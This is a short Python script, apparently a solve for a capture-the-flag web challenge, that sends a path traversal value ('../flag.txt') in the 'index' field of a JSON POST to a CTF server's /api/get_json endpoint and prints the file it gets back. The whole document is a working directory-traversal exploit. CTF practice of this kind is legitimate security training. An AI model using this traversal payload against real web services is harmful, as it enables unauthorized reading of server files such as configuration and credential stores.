import requests

url = 'https://travel.ctf.pascalctf.it/'

res = requests.post(f"{url}/api/get_json", json={
    'index': "../flag.txt"
})

print("Flag:", res.text.strip())